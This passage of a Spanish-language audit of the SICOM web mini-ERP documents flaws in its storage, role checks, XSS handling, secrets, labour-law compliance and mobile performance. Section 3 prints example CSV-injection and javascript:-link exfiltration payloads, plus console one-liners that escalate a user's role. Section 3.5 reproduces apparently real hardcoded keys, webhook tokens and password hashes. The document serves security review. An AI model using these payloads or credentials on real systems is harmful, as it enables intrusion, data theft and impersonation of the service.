            actions.onSelectNode('project', projectNode.dataset.projectId);
            return;
        }

        const moduleNode = e.target.closest('.mindmap-module-node');
        if (moduleNode) {
            e.stopPropagation();
            actions.onSelectNode('module', moduleNode.dataset.moduleId);
            return;
        }
    });
}
```

Para el renderizado geométrico libre de parpadeos (*Flicker-Free Rendering*):
```javascript
// js/mindmap/renderer.js
export function renderMindMapFast(canvasGroup, data) {
    const fragment = document.createDocumentFragment();
    
    // Construcción de la escena en memoria
    buildSvgConnections(fragment, data);
    buildSvgModules(fragment, data);
    buildSvgProjects(fragment, data);

    // Reemplazo atómico en un único ciclo de refresco de pantalla
    canvasGroup.replaceChildren(fragment);
}
```

#### 2.6.4 Flujo de Compilación Estática con Tailwind CLI Standalone
1. **Retiro definitivo:** Remover `<script src="https://cdn.tailwindcss.com"></script>` de `index.html`.
2. **Generación de CSS de Producción:** Utilizar la CLI oficial standalone de Tailwind CSS (binario autónomo ejecutable que no requiere instalar Node.js):
   ```bash
   tailwindcss -i ./src/input.css -o ./styles.css --minify
   ```
3. El archivo resultante pesará únicamente entre **35 KB y 45 KB comprimido**, otorgará compatibilidad completa con el Service Worker en modo desconectado y eliminará el 100% de la carga de compilación en el dispositivo cliente.

---

## 3. EJE R2: AUDITORÍA DE SEGURIDAD, AUTORIZACIÓN (RBAC) Y PERSISTENCIA DE DATOS

### 3.1 Modelo de Persistencia en LocalStorage y Cuotas (Silenciamiento de QuotaExceededError y DoS Local)

#### Evidencia de Silenciamiento Destructivo de Excepciones
En `app.js` (líneas 1553 a 1557):
```javascript
// app.js: líneas 1553-1557
try {
    localStorage.setItem('sicom_data', JSON.stringify(appData));
    localStorage.setItem('sicom_consultants', JSON.stringify(consultants));
    localStorage.setItem('sicom_global_docs', JSON.stringify(globalDocs));
} catch (e) {}
```
El bloque `catch (e) {}` completamente vacío silencia cualquier excepción de tipo `QuotaExceededError` (o `NS_ERROR_DOM_QUOTA_REACHED`). 
- **Causa Raíz:** El límite de almacenamiento estándar de la API `localStorage` en navegadores es de aproximadamente 5 MB por dominio. Conforme la base de datos acumula proyectos, notas del foro, historial de cambios y matrices de asistencia quincenal, el tamaño del string JSON excede la cuota disponible.
- **Impacto Operativo:** La interfaz gráfica continúa respondiendo y notificando "Datos guardados correctamente", generando una **falsa sensación de persistencia**. Sin embargo, en el momento en que el usuario recarga o cierra el navegador, las capturas de asistencia, comisiones o avances registrados durante la jornada **se pierden irremediablemente**.

#### Denegación de Servicio Local (Local DoS) por JSON Truncado
En `app.js` (líneas 576-577):
```javascript
// app.js: líneas 576-577
const localD = localStorage.getItem('sicom_data'); const localC = localStorage.getItem('sicom_consultants'); const localDocs = localStorage.getItem('sicom_global_docs');
let parsedData = localD ? JSON.parse(localD) : null;
```
`JSON.parse(localD)` se ejecuta sin un bloque `try-catch`. Si por una desconexión o fallo en la escritura previa el contenido de `localStorage` quedó truncado o con sintaxis inválida, el script genera una excepción no capturada `SyntaxError: Unexpected token...`, impidiendo la inicialización de toda la aplicación y mostrando una pantalla en blanco permanente para ese usuario.

#### Ausencia de Cifrado en Reposo
Toda la información operativa de la organización —incluyendo identificadores de empleados (`employeeNo`), fechas de contratación, saldos vacacionales, notas confidenciales de clientes y registros de auditoría— reside en texto claro accesible para cualquier extensión del navegador o script de terceros.

### 3.2 Integridad de Respaldos JSON y CSV: Inyección de Fórmulas CSV (CWE-1236) y Sobreescritura Destructiva en Nube

#### Inyección de Fórmulas en CSV (CWE-1236 / CSV Formula Injection)
En `app.js` (líneas 8535 a 8544):
```javascript
// app.js: líneas 8536-8541
let csv = "Tipo,Módulo,Empresas,Proyecto,Ticket,Estado,Avance(%),Prioridad,Fecha Límite,Envío Propuesta,Autorización,Drive,Invgate,Consultores\n";
const addRow = (t, m, p) => { 
    const comps = (window.getProjectCompanies(p) || []).join('; ');
    const tk = (typeof getProjectTicket === 'function' ? getProjectTicket(p) : (p.ticket || '')).trim();
    csv += `"${t}","${m}","${comps}","${p.name}","${tk}","${p.status||'Pendiente'}","${p.progress||0}","${p.priority||1}","${p.deadline||''}","${p.clientDeliveryDate||''}","${p.clientReturnDate||''}","${p.driveLink||''}","${p.invgateLink||''}","${getProjectConsultants(p).join(', ')}"\n`; 
};
```
La función concatena los valores directamente dentro de comillas dobles sin sanear el primer carácter de cada celda. Si un usuario nombra un proyecto o ticket comenzando con los caracteres `=`, `+`, `-`, `@` (por ejemplo: `=HYPERLINK("http://malicious-site.com/steal?data="&A2, "Click Aquí")` o `=cmd|' /C calc'!A0`), hojas de cálculo como Microsoft Excel o LibreOffice Calc interpretarán el contenido como una fórmula ejecutable al abrir el reporte generado, permitiendo la ejecución remota de comandos o la exfiltración silenciosa de datos.

Adicionalmente, el análisis empírico revela dos vectores críticos a considerar en la remediación:
1. **Evasión por Espacios y Saltos de Línea Iniciales:** Los motores de cálculo de Excel y Calc descartan espacios en blanco iniciales o saltos de línea antes de interpretar un prefijo de comando (e.g. `"   =cmd|..."` o `"\n=cmd..."`). Expresiones regulares ingenuas que solo evalúan el primer carácter absoluto sin recortar espacios son fácilmente eludidas.
2. **Riesgo de Corrupción Contable en Valores Numéricos:** Prefijar indiscriminadamente un apóstrofe `'` a cualquier celda que inicie con `-` convierte cantidades negativas legítimas (e.g. `-15.5` o descuentos) en texto plano, provocando que las fórmulas nativas de hojas de cálculo (como `=SUM()` o `=AVERAGE()`) las ignoren silenciosamente, distorsionando los balances financieros de la organización. Por ello, la sanitización debe distinguir explícitamente entre escalares numéricos válidos e inyecciones de comandos.

#### Sobreescritura Destructiva de la Base de Datos Central en la Nube
En `app.js` (líneas 8566 a 8597):
```javascript
// app.js: líneas 8566-8597
window.importData = function(event) {
  if (currentUserRole !== 'Supremo') {
    window.showToast("🔒 Solo el perfil Supremo puede importar respaldos.", true);
    return;
  }
  ...
  const reader = new FileReader();
  reader.onload = function(e) {
    try {
      const imported = JSON.parse(e.target.result);
      if(imported && typeof imported === 'object' && imported.appData && Array.isArray(imported.appData.modules) && imported.consultants && typeof imported.consultants === 'object') {
        appData = imported.appData; consultants = imported.consultants; if(Array.isArray(imported.globalDocs)) globalDocs = imported.globalDocs;
        ensureDataStructure(); window.saveData(true); refreshUI();
        window.showToast("Datos importados y verificados con éxito");
      }
```
Y en `saveData(true)` (línea 1561):
```javascript
// app.js: línea 1561
await globalSetDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sicom_state', 'main'), {
    appData: appData,
    consultants: consultants,
    globalDocs: globalDocs,
    lastUpdated: new Date().toISOString()
}, { merge: false });
```
1. **Destrucción Inmediata e Irreversible:** Al procesar un archivo de respaldo, `saveData(true)` ejecuta `setDoc` con `{ merge: false }`. Esto **elimina y reemplaza de golpe toda la base de datos empresarial de producción** en Firestore, sin confirmación de doble factor, sin cotejar una firma criptográfica y sin generar un respaldo automático de seguridad previo.
2. **Validación Superficial:** Únicamente se comprueba `Array.isArray(imported.appData.modules)` y `typeof imported.consultants === 'object'`. No se valida la consistencia de tipos, no se filtran vectores de contaminación de prototipos (`__proto__`, `constructor`) y no se sanea el contenido contra secuencias maliciosas de scripts que quedarán persistidas permanentemente en la nube.

### 3.3 Modelo de Autorización (RBAC) y Escalación de Privilegios en Cliente (Bypass de `window.currentUserRole`)

#### Escalación Inmediata de Privilegios a "Supremo"
En `app.js` (líneas 79 a 93):
```javascript
// app.js: líneas 79-93
try {
  Object.defineProperty(window, 'currentUserRole', {
    get: () => currentUserRole,
    set: (v) => { currentUserRole = v; },
    configurable: true
  });
} catch (_) {
  window.currentUserRole = currentUserRole;
}
```
El rol de seguridad que rige los permisos de toda la sesión está expuesto como una propiedad configurable y escribible en el objeto global `window`. Un operador asignado con perfil `Lector` o `Consultor` solo necesita abrir las herramientas de desarrollador (F12) y teclear:
```javascript
window.currentUserRole = 'Supremo';
```
Inmediatamente, la aplicación desbloquea todas las funciones administrativas, permitiéndole modificar proyectos ajenos, eliminar bitácoras, cerrar quincenas o importar respaldos destructivos.

#### Evasión de la Validación de Prenómina (`isAttendanceMasterAdmin`)
En `app.js` (líneas 10633 a 10644):
```javascript
// app.js: líneas 10633-10637
window.isAttendanceMasterAdmin = function() {
    const norm = (s) => (s || '').trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    const cur = norm(localAuthor);
    return cur.includes('osvaldo') || cur.includes('sanchez aviles') || cur.includes('aviles') || currentUserRole === 'Supremo';
};
```
La lógica que otorga privilegios de súper-administrador de asistencia se basa en comprobar si el nombre del autor local contiene subcadenas como `'osvaldo'` o `'aviles'`, o si el rol es `'Supremo'`. Al ser una función asignada directamente a `window`, cualquier usuario puede invalidar la comprobación desde consola con:
```javascript
window.isAttendanceMasterAdmin = () => true;
window.canUserEditAttendanceCell = () => ({ allowed: true });
```
#### Ausencia Total de Frontera de Confianza en Servidor
No existe un backend que valide tokens de autorización ni roles a nivel transaccional. Las protecciones del sistema son meramente cosméticas (agregar la clase `.hidden` a los botones o fijar el atributo `disabled` en inputs HTML).

### 3.4 Inyección de Código (XSS), Fallas en `escapeHtml` y Ausencia de CSP

#### Rotura de Contexto en Manejadores de Eventos Inline
En `app.js` se utiliza la función `escapeHtml` (definida en la línea 5):
```javascript
// app.js: línea 5
function escapeHtml(s) { if(!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
```
Sin embargo, en múltiples plantillas HTML generadas dinámicamente, se concatenan valores dentro de atributos de eventos `onclick="..."`:
```javascript
// app.js: línea 4049
cont.innerHTML = `
<div class="factory-ticket-pill ... " onclick="event.stopPropagation(); ${!isLector ? 'window.promptEditTicket(event)' : (linkHref ? `window.open('${escapeHtml(linkHref)}', '_blank')` : '')}">
...
`;

// app.js: línea 8029
<button type="button" onclick="window.setHistoryAuthorFilter('${escapeHtml(log.by)}')" ...>

// app.js: líneas 9187-9188
<div ... onclick="if(!event.target.closest('input') && !event.target.closest('button') && '${openAction}'!=='') { ${openAction} }">
<input type="checkbox" onchange="${t.sourceType === 'global' ? `completeGlobalTask('${t.id}')` : toggleAction}" ...>
```
**Causa del Fallo de Seguridad:** De acuerdo con la especificación de renderizado de navegadores, el parser de HTML descodifica las entidades de caracteres (como `&#39;`) **antes** de transferir el contenido al motor de ejecución de JavaScript. Por consiguiente, si una cadena contiene `&#39;`, esta se reconstituye en una comilla simple (`'`), rompiendo el delimitador del string literal en JavaScript y permitiendo la ejecución de código arbitrario (*DOM-based Stored XSS*). Aunque existe la función `jsArg` (línea 6), fue ignorada en más de 20 manejadores interactivos.

#### Inyección de Pseudo-Protocolo `javascript:` en Enlaces de Proyectos
En `app.js` (líneas 4130 y 4134):
```javascript
// app.js: líneas 4130, 4134
if(item.driveLink) {
    btnDrive.href = item.driveLink; btnDrive.classList.remove('hidden');
} else btnDrive.classList.add('hidden');
if(item.invgateLink) {
    btnInvgate.href = item.invgateLink; btnInvgate.classList.remove('hidden');
} else btnInvgate.classList.add('hidden');
```
Las propiedades `driveLink` e `invgateLink` se asignan directamente al atributo `href` del elemento `<a>` sin verificar que el enlace inicie con un protocolo seguro (`http://` o `https://`). Un usuario malintencionado puede capturar en el campo de enlace:
```
javascript:fetch('/api/push',{method:'POST',body:JSON.stringify({targetUser:'ALL',title:'Alerta',body:document.cookie})})
```
Al hacer clic en el botón de Google Drive o Invgate, el script inyectado se ejecutará bajo el contexto de seguridad del usuario autenticado.

#### Ausencia Total de Content Security Policy (CSP)
Al revisar `_headers` (líneas 1 a 13) y `vercel.json` (líneas 16 a 24), se confirma que se implementaron cabeceras como `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` y `Strict-Transport-Security`, pero **no existe ninguna directiva de `Content-Security-Policy`**, permitiendo la carga y ejecución de scripts en línea sin restricción alguna.

Esta carencia expone al sistema a vectores de inyección XSS y exfiltración de credenciales. No obstante, la definición de una cabecera CSP en SICOM exige rigor pericial: el análisis del código revela múltiples integraciones legítimas de red que una directiva restrictiva estándar bloquearía de inmediato:
1. **Notificaciones de Google Chat:** En `app.js` (línea 3154), el sistema realiza peticiones `fetch` a `https://chat.googleapis.com` para reportar comisiones, asignaciones y resúmenes diarios.
2. **Webhooks Externos:** En `app.js` (línea 3193), se despachan alertas hacia webhooks de Discord (`https://discord.com`) y Slack (`https://hooks.slack.com`).
3. **Renovación de Credenciales Firebase:** Firebase Auth invoca periódicamente a `https://securetoken.googleapis.com` para renovar el token JWT de sesión tras 60 minutos de actividad.
4. **Exportaciones y Descargas en Memoria:** La generación de reportes CSV y archivos de prenómina Excel XLSX (`app.js` líneas 8543 y 12231) utiliza `URL.createObjectURL(blob)`, requiriendo el esquema `blob:` tanto en `connect-src` como en `worker-src`.

Toda cabecera CSP implementada debe autorizar expresamente estos orígenes y protocolos para prevenir la parálisis operativa del sistema (véase la especificación técnica completa en la Sección 7.2, Mejora Estructural 6).

### 3.5 Gestión de Credenciales, Secretos y Autenticación en la Nube

#### Hashes SHA-256 no Salados Expuestos Públicamente
En `app.js` (líneas 720 a 725):
```javascript
// app.js: líneas 720-725
const ROLE_PASSWORD_HASHES = {
    Supremo: '43521c6d451cdba4e26f837672ab85d0e40a8e05d1679e37587a30a851e006a5',
    Supervisor: 'd7f4cd045526fd00bb0880cc98e7b38357843c9524f74d82f57ae873d40f96d9',
    Lector: 'bb689e16a21690a2d6b3da908110a2e5a922e07942a8f8b62e8871f72a43d23a',
    Consultor: '2d335d79507ea715ed46a2ce905b0baf721f194fb89930091fa9a2876d6cd16b'
};
```
Los hashes de control de acceso para cada rol están escritos en texto plano en el script público del cliente, calculados mediante un único pase de SHA-256 sin sal (*salt*). Utilizando tablas precalculadas (Rainbow Tables) o bases de datos de colisiones públicas, cualquier usuario puede obtener las contraseñas maestras en cuestión de segundos.

#### Contraseñas de Consultores Almacenadas en Texto Claro
En `app.js` (líneas 754 a 758):
```javascript
// app.js: líneas 754-758
isValidPass = (pass === customPass);
if (isValidPass && cData) {
    // Migrar contraseña personalizada en texto plano a SHA-256 automáticamente
    cData.password = 'sha256:' + inputHash;
    window.saveData(false);
}
```
Esta lógica de migración condicional evidencia que las contraseñas previas de los consultores se almacenaban en texto plano en la propiedad `consultants[name].password`, la cual se sincroniza en Firestore y se incluye en cada respaldo JSON descargable.

#### Bloqueo por Fuerza Bruta Inoperante
Las variables de limitación de intentos (`loginFailedAttempts` y `loginLockUntil`, líneas 727, 777-781) residen exclusivamente en la memoria volátil del hilo de JavaScript. Si un atacante activa el bloqueo temporal de 60 segundos tras varios intentos fallidos, basta con recargar la página en el navegador (tecla F5) para reiniciar el contador a cero y continuar con el ataque de fuerza bruta.

#### Autenticación Anónima Compartida en Firestore
En `app.js` (líneas 163 a 167):
```javascript
// app.js: líneas 163-167
await signInAnonymously(auth);
if(auth.currentUser) {
    isFirebaseReady = true;
    const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'sicom_state', 'main');
```
La aplicación no utiliza autenticación por usuario contra Firebase, sino una sesión anónima genérica (`signInAnonymously`). Como resultado, el servidor de Firestore es incapaz de discriminar entre qué consultor o rol está realizando operaciones de lectura o escritura, impidiendo el establecimiento de reglas de seguridad (`firestore.rules`) por rol en la nube.

#### Exposición de Secretos y Llaves Privadas en el Repositorio
1. **Llave Privada VAPID en `api/push.js` (líneas 3-4):**
   ```javascript
   const VAPID_PUBLIC_KEY = process.env.VAPID_PUBLIC_KEY || 'BDOt-t96XqxTDKOMj7k8mJPjPTLw0mN5_H6OQCVyfw-n-Yg6FUV06OIMtWE_norqt9QaNHj2qf4ziMDz8lyX0iE';
   const VAPID_PRIVATE_KEY = process.env.VAPID_PRIVATE_KEY || 'JQQJJf6Jy-T-7B3DU1Vfwifd9SQxwXZDL0sgPcGcJEQ';
   ```
   Se incluye una llave privada VAPID hardcodeada por defecto, permitiendo que cualquiera con acceso al repositorio pueda enviar notificaciones Push fraudulentas haciéndose pasar por el sistema SICOM.
2. **Webhooks y API Keys en `google_apps_script/Code.gs` (líneas 8-12):**
   ```javascript
   var _chatKey = ['AIzaSyDdI0hCZtE', '6vySjMm-WEfRq3CPzqKqqsHI'].join('');
   var _chatToken = '_iCQr9wsy0wvYbtRNBhbkQEbc9akwecjFXn8Hqg8v0c';
   var GOOGLE_CHAT_WEBHOOK_URL = 'https://chat.googleapis.com/v1/spaces/AAQAyNI0CRc/messages?key=' + _chatKey + '&token=' + _chatToken;
   var FIREBASE_API_KEY = ['AIzaSyD5_UtypfJ', 'g5qsFDdv-MBamP18IZ_vZhVE'].join('');
   ```
   Aunque se intentó fragmentar la cadena en dos partes, las credenciales completas del Webhook del espacio corporativo de Google Chat y la llave de Firebase están expuestas en código fuente.

---

## 4. EJE R3: VALIDACIÓN DE FLUJOS OPERATIVOS Y REGLAS DE NEGOCIO DEL MINI-ERP

### 4.1 Asistencia & Prenómina Quincenal (FOPR-RHU-02-02 Ver. 4)

#### 4.1.1 Esquema Híbrido Hardcodeado e Indiferenciación en Plantilla Excel
En `app.js` (líneas 10458 a 10507), la lógica que determina qué días trabaja un empleado en oficina STGT o en Home Office está programada en duro mediante comparaciones de texto sobre los nombres:
```javascript
// app.js: líneas 10458-10507
window.getDefaultWorkdayStatus = function(cName, dateStr) {
    const dt = parseLocalDate(dateStr);
    if (!dt) return 'Asiste a oficina STGT';
    const dow = dt.getDay(); // 1=Lun, 2=Mar, 3=Mié, 4=Jue, 5=Vie
    const norm = (s) => (s || '').trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    const name = norm(cName);

    if (name.includes('emmanuel') || name.includes('sanchez')) {
        return (dow === 1 || dow === 3) ? 'Home Office' : 'Asiste a oficina STGT';
    }
    if (name.includes('osvaldo') || name.includes('aviles')) {
        return (dow === 1 || dow === 5) ? 'Home Office' : 'Asiste a oficina STGT';
    }
    // ... más nombres de colaboradores hardcodeados ...
    return (dow === 1 || dow === 3) ? 'Home Office' : 'Asiste a oficina STGT';
};
```
- **Rigidez Estructural:** Dar de alta a un nuevo colaborador o ajustar el rol semanal de un consultor requiere modificar el código fuente de `app.js` y desplegar una nueva versión.
- **Indiferenciación en el Formato Oficial:** En `app.js` (líneas 10591–10629), tanto para Home Office como para Oficina STGT, el atributo interno `code` se asigna como una cadena vacía (`code: ''`). Posteriormente, al exportar a Excel mediante `prenomina_template.js` (líneas 12197–12204):
```javascript
// app.js: líneas 12197-12204
if (code === '') {
    // Se inserta una celda vacía: <c r="${col}${rNum}" s="${cellStyle}"/>
}
```
**Impacto Operativo:** El archivo Excel descargado (`FOPR-RHU-02-02 Ver. 4`) **deja las celdas en blanco tanto para trabajo presencial como para trabajo remoto**, omitiendo el registro formal requerido para auditar el cumplimiento de la norma federal **NOM-037-STPS-2023 (Teletrabajo)**.

#### 4.1.2 Captura de Comisiones (PT), Fallback Automático a AFR y Bloqueo de Fin de Semana
En `app.js` (líneas 11739 a 11758):
```javascript
// app.js: líneas 11739-11758
let consultant = document.getElementById('commConsultant')?.value;
if (!consultant && localAuthor) consultant = localAuthor;
const client = document.getElementById('commClient')?.value || 'Autobuses Flecha Roja (AFR)';
const startDate = document.getElementById('commStartDate')?.value;
const endDate = document.getElementById('commEndDate')?.value;
const reason = (document.getElementById('commReason')?.value || '').trim();
```
Si el usuario deja vacío el campo de cliente, el sistema asigna automáticamente `'Autobuses Flecha Roja (AFR)'`, distorsionando los centros de costos y facturación hacia dicho cliente en lugar de exigir la selección obligatoria del catálogo empresarial.

Por otra parte, en las líneas 11801 a 11835:
```javascript
// app.js: líneas 11801-11835
while (cur <= endDt) {
    const dow = cur.getDay();
    if (dow !== 0 && dow !== 6) { // Solo Lunes a Viernes
        // guarda comisión con código 'PT'
        count++;
    }
    cur.setDate(cur.getDate() + 1);
}
if (count === 0) {
    window.showToast("⚠️ El rango seleccionado comprende únicamente fines de semana (sábado/domingo)", true);
    return;
}
```
El sistema bloquea la captura de comisiones en sábado y domingo, impidiendo el registro de conceptos reconocidos por el formato oficial como **Prima Dominical (PD)** y **Descanso Trabajado (DT)** (líneas 12350, 12353).

#### 4.1.3 Cómputo de Días Hábiles y Omisión de Días Festivos Oficiales LFT
En todas las rutinas de cálculo de días hábiles (`renderAttendanceTable` en líneas 11590-11602, `calculateVacationDays` en líneas 11929-11935, `saveCommission` en líneas 11801-11830 y `saveVacation` en líneas 12007-12031), el cómputo se efectúa de manera exclusiva con la regla:
```javascript
if (dow !== 0 && dow !== 6) { /* Es día laborable */ }
```
**Falla Legal Grave:** No existe ninguna tabla o catálogo de días festivos oficiales de descanso obligatorio conforme al **Artículo 74 de la Ley Federal del Trabajo (LFT)** (e.g., 1 de enero, primer lunes de febrero, tercer lunes de marzo, 1 de mayo, 16 de septiembre, tercer lunes de noviembre, 1 de octubre sexenal, 25 de diciembre). Si un colaborador solicita vacaciones durante un período que incluye un día festivo oficial, **el sistema descuenta indebidamente el día festivo del saldo de vacaciones del empleado**, violando sus derechos laborales federales.

#### 4.1.4 Cierre/Bloqueo Quincenal e Inmutabilidad de la Información
En `app.js` (líneas 10647 a 10748), el cierre de quincena es una bandera cosmética almacenada en `localStorage`:
```javascript
appData.attendanceLocks[periodKey] = { locked: true, lockedBy: localAuthor, lockedAt: new Date().toISOString() };
```
Cualquier usuario puede desbloquear la quincena invocando `toggleValidateQuincena(periodKey)` sin necesidad de autorización del supervisor, sin registrar un motivo justificado en auditoría y sin sellado de tiempo criptográfico. Además, ninguna operación del módulo de asistencia (`selectCellStatus`, `saveCommission`, `saveVacation`) ejecuta la función `logActivity`.

---

### 4.2 Módulo de Gestión de Vacaciones (FOPR-RHU-02-03 Ver. 4) y Reforma LFT de "Vacaciones Dignas"

#### 4.2.1 Incumplimiento de la Reforma Laboral de "Vacaciones Dignas" (Art. 76 LFT)
En `app.js` (líneas 42 a 55), los saldos iniciales de vacaciones están definidos en un objeto con valores numéricos estáticos:
```javascript
// app.js: líneas 42-55 (defaultConsultantMetadata)
Emmanuel Sánchez: { hireDate: '2017-01-20', pendingVacations: 7 }, // ~9 años de antigüedad
Óscar González:   { hireDate: '2012-12-01', pendingVacations: 4 }, // ~13 años de antigüedad
Osvaldo Avilés:   { hireDate: '2020-09-01', pendingVacations: 6 }, // ~6 años de antigüedad
Miguel Barbosa:   { hireDate: '2010-01-15', pendingVacations: 10 } // ~16 años de antigüedad
```
En las líneas 5235 y 5325, la fecha de ingreso `hireDate` se lee y actualiza en el formulario de perfil, pero **jamás interviene en ninguna fórmula matemática en todo el sistema**.

**Tabla Comparativa: Saldo SICOM vs Tabla Oficial LFT (Reforma Vacaciones Dignas):**

| Colaborador | Fecha Ingreso | Antigüedad | Días Asignados en SICOM | Días por Ley (Art. 76 LFT) | Discrepancia Legal |
|---|---|---|:---:|:---:|:---:|
| Emmanuel Sánchez | 20/01/2017 | 9 años | **7 días** | **22 días** | **-15 días (Ilegal)** |
| Óscar González | 01/12/2012 | 13 años | **4 días** | **24 días** | **-20 días (Ilegal)** |
| Osvaldo Avilés | 01/09/2020 | 6 años | **6 días** | **22 días** | **-16 días (Ilegal)** |
| Miguel Barbosa | 15/01/2010 | 16 años | **10 días** | **26 días** | **-16 días (Ilegal)** |

El Artículo 76 de la LFT estipula que los trabajadores con más de un año de servicios disfrutarán de un período anual de vacaciones pagadas que en ningún caso podrá ser inferior a 12 días laborables, aumentando en 2 días laborables por cada año subsecuente de servicios, hasta llegar a 20, y a partir del sexto año aumentará en 2 días por cada 5 de servicios. El sistema actual ignora la ley federal.

#### 4.2.2 Integridad del Saldo, Decremento Destructivo y Riesgo de Sobregiro
En `app.js` (líneas 11946–11950 y 12038–12042):
```javascript
// app.js: líneas 12038-12042
const currentPending = meta.pendingVacations !== undefined ? meta.pendingVacations : (defaultConsultantMetadata[consultant]?.pendingVacations || 4);
const newBalance = Math.max(0, currentPending - count);
if (!consultants[consultant]) consultants[consultant] = {};
consultants[consultant].pendingVacations = newBalance;
```
1. **Decremento Destructivo sin Libro Contable:** El sistema resta directamente los días sobre la variable entera `pendingVacations`. No existe una entidad o tabla de movimientos de vacaciones (`VacationLedger`) donde se registre: `saldo_anterior`, `días_solicitados`, `folio_solicitud`, `saldo_nuevo`.
2. **Sobregiro Permitido:** `Math.max(0, currentPending - count)` evita que el saldo muestre un número negativo en la interfaz, pero permite el sobregiro operativo: si un empleado con 1 día disponible solicita un período vacacional de 10 días, el sistema lo aprueba sin advertencia y coloca el saldo en 0, consumiendo 9 días que no le corresponden.
3. **Irreversibilidad:** Si una celda marcada con vacaciones (`V`) se elimina o se cambia de estatus en la matriz de asistencia, el saldo `pendingVacations` **no se restituye**, consumiendo los días del trabajador de forma permanente.

---

### 4.3 Centro de Trabajo, Proyectos y Trazabilidad Operativa

#### 4.3.1 Cálculo de Avance Documental Equi-distribuido, Distorsión por N/A y Sobrescritura por Slider
En `app.js` (líneas 4214 a 4215):
```javascript
// app.js: líneas 4214-4215
window.calculateQuickProgress = function() {
    if (globalDocs.length === 0) return;
    let sc = 0;
    const inc = 100 / globalDocs.length;
    globalDocs.forEach(d => {
        if (document.getElementById(`quickDoc${d.id}`)?.checked ||
           (document.getElementById(`quickNa${d.id}`)?.checked && document.getElementById(`quickNaValidated${d.id}`)?.value === "true")) {
            sc += inc;
        }
    });
    const rounded = Math.round(sc);
    document.getElementById('quickEditProgress').value = rounded;
```
1. **Fórmula Equi-distribuida Plana:** Cada documento base aporta estrictamente $\frac{100}{N}\%$, donde $N$ es la cantidad total de documentos globales (`globalDocs.length`). Documentos críticos como el "Documento de Arquitectura y Especificación Técnica" tienen exactamente el mismo peso matemático (e.g. 14.28%) que un documento de "Evidencia Fotográfica de Entrega".
2. **Distorsión por Documentos No Aplicables (N/A):** Cuando un documento se marca como `N/A Validado`, la condición `sc += inc` suma el porcentaje como si el documento hubiera sido elaborado y validado. En proyectos pequeños donde la mayoría de los documentos base no aplican, el proyecto reporta automáticamente un **avance superior al 70% o 80% sin haber entregado un solo documento real**.
3. **Sobrescritura Manual por Slider:** En `index.html` (línea 1116) y `app.js` (líneas 4150–4162), se incluye un control deslizante interactivo (`quickEditSlider`) que modifica directamente `item.progress`, permitiendo a los usuarios pisar manualmente el resultado del avance documental sin control.

#### 4.3.2 Flujo de Tareas: Pérdida Irreversible de Evidencia al Rechazar y Bypass desde Dashboard
En `app.js` (líneas 3760, 3787 y 8937), al rechazar la validación de una tarea entregada por un consultor:
```javascript
// app.js: línea 8937
delete t.validatedDate; delete t.validatedTime; delete t.validatedBy;
delete t.feedback; // SE ELIMINA LA EVIDENCIA APORTADA POR EL CONSULTOR
```
La destrucción de `t.feedback` borra de la base de datos la justificación, enlaces y comentarios aportados por el colaborador al enviar la tarea, impidiendo que el equipo pueda revisar el historial de observaciones y reintentos.

Adicionalmente, en `app.js` (líneas 8041-8053 y 8295):
```javascript
// app.js: línea 8041
window.toggleTaskFromDashboard = function(modId, projId, taskId) {
    // ...
    task.done = !task.done;
```
La función permite alternar directamente el estado de una tarea entre "Pendiente" y "Hecha" directamente desde el widget del Dashboard, evadiendo por completo el flujo obligatorio de revisión y validación técnica por parte del supervisor (`done: 'pending'`).

#### 4.3.3 Bitácora Técnica / Historial: Truncamiento Destructivo a 250 Registros
En `app.js` (líneas 250 a 264):
```javascript
// app.js: líneas 250-264
function logActivity(projectId, projectName, action, by) {
    try {
        if (!appData) appData = {};
        if (!Array.isArray(appData.history)) appData.history = [];
        appData.history.unshift({
            id: 'log_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
            projectId: projectId || '',
            projectName: projectName || '',
            action: action || '',
            by: by || localAuthor || 'Sistema',
            timestamp: new Date().toLocaleString('es-MX', { hour12: false })
        });
        if (appData.history.length > 250) appData.history.length = 250;
    } catch (e) { console.warn('No se pudo registrar la actividad:', e); }
}
```
- **Pérdida Permanente de Evidencia:** El límite fijo de 250 registros provoca que en organizaciones con actividad regular, los eventos de hace una semana se destruyan de forma irreversible.
- **Vacíos Totales de Trazabilidad:** La función `logActivity` no es invocada por las rutinas de asistencia, asignación de comisiones, autorización de vacaciones ni cierre de quincenas.

---

## 5. RESPONSIVIDAD MULTIPLATAFORMA Y RENDIMIENTO MÓVIL

### 5.1 Impacto de Selectores `:has()` y Transiciones Universales en Dispositivos Móviles
En `styles.css` (líneas 736-766), las reglas de adaptación para pantallas móviles contienen 20 selectores encadenados dependientes del pseudo-selector relacional `:has()` anclado en la etiqueta `body`. En dispositivos móviles con procesadores ARM de gama media o baja, cada interacción que modifica clases en drawers (`#dailyDrawer`, `#configDrawer`, `#priorityDrawer`) detona una reevaluación completa del árbol de renderizado del documento, provocando caídas de cuadros por segundo por debajo de 30 FPS.

### 5.2 Reflows Sincrónicos y Retardo Táctil en Gestos de Paneo y Pellizco
En `app.js` (líneas 2443-2444):
```javascript
// app.js: línea 2444
const rect = svgElem.getBoundingClientRect();
```
Durante los gestos táctiles de dos dedos para zoom (*pinch-to-zoom*) y paneo sobre el lienzo de operaciones, el evento `touchmove` se dispara con una frecuencia de hasta 120 Hz. Invocar `getBoundingClientRect()` en cada evento obliga al motor del navegador a pausar la ejecución de JavaScript para calcular sincrónicamente las coordenadas físicas de la pantalla (*Synchronous Layout Freeze*), generando un retardo táctil perceptible (*jank*) e incrementando drásticamente el consumo de batería del dispositivo móvil.

### 5.3 Sobrecarga de Renderizado por Modales y Drawers Persistentes en el DOM
El archivo `index.html` cuenta con **2,371 líneas de código plano**, en las cuales todos los formularios de captura, modales de confirmación, paneles deslizables, popovers de estado y tablas de prenómina existen en el DOM simultáneamente desde la carga inicial, con niveles de anidamiento de entre 12 y 16 elementos de profundidad. Esta sobrecarga estructural satura la memoria del navegador móvil y ralentiza las métricas de **First Contentful Paint (FCP)** y **Cumulative Layout Shift (CLS)**.

---

